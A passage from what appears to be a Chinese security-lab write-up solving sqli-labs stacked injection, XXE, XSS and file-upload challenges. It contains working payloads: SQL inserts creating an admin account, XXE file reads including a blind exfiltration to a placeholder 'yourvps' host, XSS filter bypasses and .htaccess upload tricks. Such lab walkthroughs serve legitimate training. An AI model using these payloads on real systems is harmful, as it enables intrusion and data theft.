<pre><code class="hljs pgsql">?sort=<span class="hljs-number">1</span>;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;16&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>)<span class="hljs-comment">--+</span></code></pre>

<h2 id="level53"><a href="#level53" class="headerlink" title="level53"></a>level53</h2><p>和51一样，只是不会回显错误，堆叠注入方式相同。</p>
<pre><code class="hljs n1ql">?sort=1&#x27;;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;16&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>)--+</code></pre>

<h1 id="xxe挑战"><a href="#xxe挑战" class="headerlink" title="xxe挑战"></a>xxe挑战</h1><p>github地址：<a href="https://github.com/vulnspy/phpaudit-XXE/archive/master.zip">https://github.com/vulnspy/phpaudit-XXE/archive/master.zip</a></p>
<p>因为环境搭建比较简单就直接在windows上运行了</p>
<p>读取的文件也随之改变，在D盘中建立一个1.txt</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303194816074.png" alt="image-20210303194816074"></p>
<h2 id="DOMDocument"><a href="#DOMDocument" class="headerlink" title="DOMDocument"></a>DOMDocument</h2><p>使用如下payload读取文件</p>
<pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">ANY</span> [</span>
<span class="hljs-meta">	<span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">content</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///D:/1.txt&quot;</span>&gt;</span></span>
<span class="hljs-meta">]&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span>
	<span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;content;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span></code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303194904746.png" alt="image-20210303194904746"></p>
<p>漏洞原因</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210330213939369.png" alt="image-20210330213939369" style="zoom:67%;">

<p>DOmDocument类</p>
<p><code>$dom = new DOMDocument();</code></p>
<pre><code class="hljs php"><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);
<span class="hljs-variable">$data</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>])?<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>]):<span class="hljs-string">&#x27;&#x27;</span>;
<span class="hljs-variable">$resp</span> = <span class="hljs-string">&#x27;&#x27;</span>;
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span> != <span class="hljs-literal">false</span>)&#123;
    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();
    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$data</span>, LIBXML_NOENT);
    <span class="hljs-title function_ invoke__">ob_start</span>();
    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$dom</span>);
    <span class="hljs-variable">$resp</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>();
    <span class="hljs-title function_ invoke__">ob_end_clean</span>();
    
&#125;</code></pre>

<h2 id="SimpleXMLElement"><a href="#SimpleXMLElement" class="headerlink" title="SimpleXMLElement"></a>SimpleXMLElement</h2><p>使用payload：</p>
<pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">ANY</span> [</span>
<span class="hljs-meta">	<span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">content</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///D:/1.txt&quot;</span>&gt;</span></span>
<span class="hljs-meta">]&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span>
	<span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;content;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span></code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303195204160.png" alt="image-20210303195204160"></p>
<p>漏洞代码</p>
<p>造成 XXE 的类是 SimpleXMLElement</p>
<pre><code class="hljs php"><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);
<span class="hljs-variable">$data</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>])?<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>]):<span class="hljs-string">&#x27;&#x27;</span>;
<span class="hljs-variable">$resp</span> = <span class="hljs-string">&#x27;&#x27;</span>;
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span> != <span class="hljs-literal">false</span>)&#123;
    <span class="hljs-variable">$xml</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleXMLElement</span>(<span class="hljs-variable">$data</span>, LIBXML_NOENT);
    <span class="hljs-title function_ invoke__">ob_start</span>();
    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$xml</span>);
    <span class="hljs-variable">$resp</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>();
    <span class="hljs-title function_ invoke__">ob_end_clean</span>();   
&#125;</code></pre>

<h2 id="simplexml-load-string"><a href="#simplexml-load-string" class="headerlink" title="simplexml_load_string"></a>simplexml_load_string</h2><p>payload:</p>
<pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">ANY</span> [</span>
<span class="hljs-meta">	<span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">content</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///D:/1.txt&quot;</span>&gt;</span></span>
<span class="hljs-meta">]&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span>
	<span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;content;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span></code></pre>



<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303195407342.png" alt="image-20210303195407342"></p>
<p>造成漏洞的是simplexml_load_string，代码如下</p>
<pre><code class="hljs php"><span class="hljs-variable">$data</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>])?<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>]):<span class="hljs-string">&#x27;&#x27;</span>;
<span class="hljs-variable">$resp</span> = <span class="hljs-string">&#x27;&#x27;</span>;
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span> != <span class="hljs-literal">false</span>)&#123;
    <span class="hljs-variable">$xml</span> = <span class="hljs-title function_ invoke__">simplexml_load_string</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&#x27;SimpleXMLElement&#x27;</span>, LIBXML_NOENT);
    <span class="hljs-title function_ invoke__">ob_start</span>();
    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$xml</span>);
    <span class="hljs-variable">$resp</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>();
    <span class="hljs-title function_ invoke__">ob_end_clean</span>();
    
&#125;</code></pre>



<h2 id="BlindXXE"><a href="#BlindXXE" class="headerlink" title="BlindXXE"></a>BlindXXE</h2><p>这一关提交payload无法看到内容，但是可以看到是访问成功的</p>
<p>正常情况下，只会返回给我们ok，即有查询结果，但是不会告诉我们结果是什么</p>
<p>源码如下</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s&#x27;</span>]))&#123;
    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);
    <span class="hljs-keyword">exit</span>;
&#125;
<span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);
<span class="hljs-variable">$data</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>])?<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>]):<span class="hljs-string">&#x27;&#x27;</span>;
<span class="hljs-variable">$resp</span> = <span class="hljs-string">&#x27;&#x27;</span>;
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span> != <span class="hljs-literal">false</span>)&#123;
    <span class="hljs-variable">$xml</span> = <span class="hljs-title function_ invoke__">simplexml_load_string</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&#x27;SimpleXMLElement&#x27;</span>, LIBXML_NOENT);
    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$xml</span> &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xml</span>-&gt;name))&#123;
        <span class="hljs-variable">$name</span> = <span class="hljs-variable">$xml</span>-&gt;name;
    &#125;
   <span class="hljs-keyword">echo</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$name</span>)?<span class="hljs-string">&#x27;ok&#x27;</span>:<span class="hljs-string">&#x27;error&#x27;</span>; 
&#125;
<span class="hljs-meta">?&gt;</span></code></pre>

<p>上面的例子是因为<code>echo htmlspecialchars($resp);</code>这句代码所以才有回显，那么把这段代码去掉，就变成了无回显。那么，是不是就不能进行xxe了呢，答案是否定的，虽然靶机没有返回给我们数据，但是我们可以把数据带到我们自己的服务器上。</p>
<p>我们传入如下的payload：</p>
<pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE a [</span>
<span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=D:/1.txt&quot;</span>&gt;</span></span>
<span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://yourvps/evil.xml&quot;</span>&gt;</span></span>
<span class="hljs-meta">    %dtd;</span>
<span class="hljs-meta">    %send;</span>
<span class="hljs-meta">]&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">abc</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">abc</span>&gt;</span></code></pre>

<p>然后在自己的vps上的<strong>evil.xml</strong>写入：</p>
<pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">payload</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://yourvps/?content=%file;&#x27;&gt;&quot;</span>&gt;</span> %payload;</code></pre>

<p>注意，因为这里是参数实体payload来<strong>嵌套定义</strong>参数实体<strong>send</strong>，所以被<strong>嵌套定义</strong>的参数实体<code>%</code>一定要HTML编码为：<code>%</code></p>
<p>如此一来，调用的过程就变成了：参数实体dtd通过<strong>http</strong>协议来访问vps上的<strong>evil.xml</strong>，然后返回<strong>evil.xml</strong>的内容，调用了参数实体<strong>payload</strong>，然后<strong>payload</strong>又调用了参数实体<strong>send</strong>，<strong>send</strong>的作用就是把参数实体<strong>file</strong>（即文件D:&#x2F;1.txt的base64编码内容）发送到我们的vps上，注意在服务器上监听</p>
<h1 id="xss通关"><a href="#xss通关" class="headerlink" title="xss通关"></a>xss通关</h1><p>因为网上有挑战题目的网址就没在本地搭建</p>
<h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p>最基础的xss，get提交</p>
<pre><code class="hljs javascript">?name=<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span></code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303151729341.png" alt="image-20210303151729341"></p>
<h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p>第二关直接提交会发现没有弹窗</p>
<p>查看源码可以看到，因为<code>&lt;script&gt;</code>，被包裹在<code>input</code>标签中无法起作用，因此需要先闭合<code>input</code>标签</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303152358665.png" alt="image-20210303152358665" style="zoom:50%;">



<p>payload</p>
<pre><code class="hljs xml">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303152632625.png" alt="image-20210303152632625" style="zoom:50%;">



<h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><p>直接提交查看源码</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303152721584.png" alt="image-20210303152721584"></p>
<p>可以发现提交后的数据经过<code>htmlspecialchars()</code>转化成了实体变量不在有js代码的作用，所以需要换一种方法</p>
<p>payload</p>
<pre><code class="hljs \">&#x27;onclick=&#x27;javascript:alert(1)&#x27;</code></pre>

<p>再点击一次就可以过关</p>
<h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><p>这题与上面的一样只不过这次换成了双引号闭合</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303153135610.png" alt="image-20210303153135610"></p>
<pre><code class="hljs 1c"><span class="hljs-string">&quot;onclick=&#x27;javascript:alert(1)&#x27;</span></code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303153118763.png" alt="image-20210303153118763" style="zoom:50%;">

<h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><p>提交<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303153451829.png" alt="image-20210303153451829"></p>
<p>可以发现script被换成了scr_ipt，使用<code>&quot;onclick=&#39;javascript:alert(1)&#39;</code>也不行</p>
<p>再换一种方法</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303153621744.png" alt="image-20210303153621744"></p>
<h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><p>尝试了</p>
<pre><code class="hljs routeros">&lt;input <span class="hljs-attribute">name</span>=keyword  <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot; &quot;</span>&gt;&lt;a <span class="hljs-attribute">hr_ef</span>=<span class="hljs-string">&quot;javascript:alert(1)&quot;</span>&gt;&quot;&gt;
&lt;input <span class="hljs-attribute">name</span>=keyword  <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot; &quot;</span>o_nclick=&#x27;javascript:alert(1)&#x27; <span class="hljs-string">&quot;&gt;</span>
<span class="hljs-string">&lt;input name=keyword  value=&quot;</span> <span class="hljs-string">&quot;&lt;scr_ipt&gt; alert(1)&lt;/script&gt;&quot;</span>&gt;</code></pre>

<p>但是都不行了，尝试了看样子是过了href, onclick, script关键词，尝试大小写绕过</p>
<p>提交</p>
<pre><code class="hljs 1c"><span class="hljs-string">&quot;oNclick=&#x27;javascript:alert(1)&#x27;</span></code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303160021818.png" alt="image-20210303160021818"></p>
<h2 id="7"><a href="#7" class="headerlink" title="7"></a>7</h2><p>提交<code>&quot;oNclick=&#39;javascript:alert(1)&#39;</code>,但是发现on被过滤了</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303160102536.png" alt="image-20210303160102536"></p>
<p>直接尝试双写绕过</p>
<pre><code class="hljs ada">oonnclick=<span class="hljs-symbol">&#x27;javascript</span>:alert(<span class="hljs-number">1</span>)</code></pre>



<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303160204046.png" alt="image-20210303160204046"></p>
<h2 id="8"><a href="#8" class="headerlink" title="8"></a>8</h2><p>提交<code>&quot;oNclick=&#39;javascript:alert(1)</code>，可以发现过滤了 <code>&quot; &lt; &gt;</code>，而且进行了实体转换</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303160514318.png" alt="image-20210303160514318"></p>
<p>换一种新的注入方法html字符转换绕过</p>
<pre><code class="hljs apache"><span class="hljs-attribute">java</span>&amp;#<span class="hljs-number">115</span>;&amp;#<span class="hljs-number">99</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">105</span>;&amp;#<span class="hljs-number">112</span>;&amp;#<span class="hljs-number">116</span>;:alert(<span class="hljs-number">1</span>)</code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303160720539.png" alt="image-20210303160720539"></p>
<h2 id="9"><a href="#9" class="headerlink" title="9"></a>9</h2><p>尝试第八关使用的代码但是发现不行</p>
<p>但是查看源码可以发现提示你的链接不合法，那么合法的链接有什么特点呢</p>
<p>就是带有协议头</p>
<pre><code class="hljs javascript">java&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>) <span class="hljs-comment">// http://</span></code></pre>

<h2 id="10"><a href="#10" class="headerlink" title="10"></a>10</h2><p>尝试了几种方法之后发现 ,没有输出点</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303162415275.png" alt="image-20210303162415275"></p>
<p>可以发现输入点是隐藏的</p>
<p>使用下面代码测试以上三个哪个是可以注入的</p>
<pre><code class="hljs dts"><span class="hljs-variable">&amp;t_link</span>=<span class="hljs-string">&quot; text&quot;</span> <span class="hljs-variable">&amp;t_history</span>=<span class="hljs-string">&quot;text&quot;</span><span class="hljs-variable">&amp;t_sort</span>=<span class="hljs-string">&quot;text&quot;</span></code></pre>



<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303162558986.png" alt="image-20210303162558986"></p>
<p>再构造代码</p>
<pre><code class="hljs isbl">&amp;<span class="hljs-variable">t_sort</span>=<span class="hljs-string">&quot; type=&quot;</span><span class="hljs-variable">text</span><span class="hljs-string">&quot; onclick=&quot;</span><span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-number">1</span>)</span></code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303162721705.png" alt="image-20210303162721705"></p>
<h2 id="11"><a href="#11" class="headerlink" title="11"></a>11</h2><p>进入页面后尝试使用上一关的方法但是无效，上网查看后发现是再refere头注入</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303164336051.png" alt="image-20210303164336051" style="zoom:50%;">

<p>可以发现相应包中已经被注入了XSS</p>
<p>在抓包页面返回给浏览器，就会出现被注入的输入框</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303164657154.png" alt="image-20210303164657154" style="zoom:50%;">

<h2 id="12"><a href="#12" class="headerlink" title="12"></a>12</h2><p>继续抓包，这次可以发现是在UA中注入</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303164836733.png" alt="image-20210303164836733" style="zoom:67%;">

<p>与上一关做法相似</p>
<p>出现输入框点击即可</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303164930662.png" alt="image-20210303164930662" style="zoom:50%;">

<h2 id="13"><a href="#13" class="headerlink" title="13"></a>13</h2><p>这关是在cookie处注入，方法与之前相同</p>
<p>payload</p>
<pre><code class="hljs isbl"><span class="hljs-variable">cookie</span>: 原值+<span class="hljs-variable">user</span>=<span class="hljs-string">&quot; type=text onclick=&quot;</span><span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-number">1</span>)</span></code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303165143032.png" alt="image-20210303165143032" style="zoom:67%;">

<h2 id="14"><a href="#14" class="headerlink" title="14"></a>14</h2><p>需要使用带XSS的图片</p>
<h2 id="15"><a href="#15" class="headerlink" title="15"></a>15</h2><p>直接查看源码</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303171027487.png" alt="image-20210303171027487" style="zoom:50%;">



<p>这里用了angularjs的ng-include，直接在包含的页面里用<code>&lt;script&gt;</code>触发不了，用了img标签</p>
<p>AngularJS ng-include 指令</p>
<p>ng-include 指令用于包含外部的 HTML 文件。</p>
<p>包含的内容将作为指定元素的子节点。</p>
<p>ng-include 属性的值可以是一个表达式，返回一个文件名。</p>
<p>默认情况下，包含的文件需要包含在同一个域名下。</p>
<pre><code class="hljs abnf">&lt;element ng-include<span class="hljs-operator">=</span><span class="hljs-string">&quot;filename&quot;</span> onload<span class="hljs-operator">=</span><span class="hljs-string">&quot;expression&quot;</span> autoscroll<span class="hljs-operator">=</span><span class="hljs-string">&quot;expression&quot;</span> &gt;&lt;/element&gt;</code></pre>

<p>遵循SOP，只好调用第一关代码。</p>
<p>需要单引号包裹，否则变成注释。</p>
<p>paload：</p>
<pre><code class="hljs xml">/level15.php?src=&#x27;level1.php?name=test<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span>&#x27;</code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303171428095.png" alt="image-20210303171428095" style="zoom:50%;">

<h2 id="16"><a href="#16" class="headerlink" title="16"></a>16</h2><p>测试发现过滤空格，script，&#x2F;，所以使用%0d %0a做分割符绕过过滤</p>
<p>payload</p>
<pre><code class="hljs llvm">&lt;img<span class="hljs-variable">%0</span>Asrc<span class="hljs-operator">=</span><span class="hljs-keyword">x</span><span class="hljs-variable">%0</span>Aonerror<span class="hljs-operator">=</span>alert(a)&gt;

&lt;iframe<span class="hljs-variable">%0</span>asrc<span class="hljs-operator">=</span><span class="hljs-keyword">x</span><span class="hljs-variable">%0</span>donmouseover<span class="hljs-operator">=</span>alert`<span class="hljs-number">1</span>`&gt;&lt;/iframe&gt;</code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303171803825.png" alt="image-20210303171803825" style="zoom:50%;">



<h2 id="17"><a href="#17" class="headerlink" title="17"></a>17</h2><p>查看源码找到注入位置</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303172359498.png" alt="image-20210303172359498" style="zoom:50%;">



<p>但是这里过滤<code>&lt;, &gt;</code>，使用事件触发弹窗</p>
<p>Payload：</p>
<pre><code class="hljs routeros">?<span class="hljs-attribute">arg01</span>=&amp;arg02= <span class="hljs-attribute">onmouseover</span>=alert(1)</code></pre>

<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>环境使用phpstudy很容易搭建</p>
<h2 id="pass1"><a href="#pass1" class="headerlink" title="pass1"></a>pass1</h2><p>直接抓包修改文件后缀名为jpg,png,gif即可</p>
<h2 id="pass2"><a href="#pass2" class="headerlink" title="pass2"></a>pass2</h2><p>查看源码</p>
<pre><code class="hljs php"><span class="hljs-keyword">if</span> ((<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/jpeg&#x27;</span>) || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/png&#x27;</span>) || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/gif&#x27;</span>))</code></pre>

<p>这段代码说明是对文件的<code>MIME</code>类型进行了过滤，直接上传 1.php 抓包后修改文件类型为 <code>&#39;image/jpeg&#39; ,&#39;image/png&#39;,&#39;image/gif&#39;</code>,这三个类型都为图片</p>
<p>抓包修改MIME即可</p>
<p>知识点补充：</p>
<p> <strong>MIME类型对大小写不敏感，但是传统写法都是小写。</strong> </p>
<pre><code class="hljs bash">text/plain
text/html
image/jpeg
image/png
audio/mpeg
audio/ogg
audio/*
video/mp4
application/*
application/json
application/javascript
application/ecmascript
application/octet-stream</code></pre>

<p>更详细的解释，</p>
<h2 id="pass3"><a href="#pass3" class="headerlink" title="pass3"></a>pass3</h2><pre><code class="hljs php"><span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;.asp&#x27;</span>,<span class="hljs-string">&#x27;.aspx&#x27;</span>,<span class="hljs-string">&#x27;.php&#x27;</span>,<span class="hljs-string">&#x27;.jsp&#x27;</span>);</code></pre>

<p>只禁止了.asp,.aspx,.php,.jsp后缀文件，可以使用php3,php5,php7,phtml等等后缀名绕过</p>
<h2 id="pass4"><a href="#pass4" class="headerlink" title="pass4"></a>pass4</h2><p><strong>.htaccess</strong>文件的作用</p>
<blockquote>
<ul>
<li>URL重写、自定义错误页面</li>
<li>MIME类型配置</li>
<li>访问权限控制等</li>
<li>主要体现在伪静态的应用</li>
<li>图片防盗链</li>
<li>自定义404错误页面</li>
<li>阻止&#x2F;允许特定IP&#x2F;IP段</li>
<li>目录浏览与主页</li>
<li>禁止访问指定文件类型</li>
<li>文件密码保护</li>
</ul>
</blockquote>
<pre><code class="hljs apache"><span class="hljs-section">&lt;FilesMatch <span class="hljs-string">&quot;1.jpg&quot;</span>&gt;</span>
<span class="hljs-attribute">SetHandler</span> application/x-httpd-php
<span class="hljs-section">&lt;/FilesMatch&gt;</span></code></pre>

<p>这几句代码的意思：</p>
<p>通过.htaccess文件调用php解析器去解析一个文件名中只要包含”1.jpg”这个字符串的任意文件，</p>
<p>无论扩展名是什么(没有也行)，都以php的方式来解析</p>
<p>上传完.htaccess文件后直接上传一个 <code>1.jpg</code>即可</p>
<h2 id="pass5"><a href="#pass5" class="headerlink" title="pass5"></a>pass5</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;
        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span 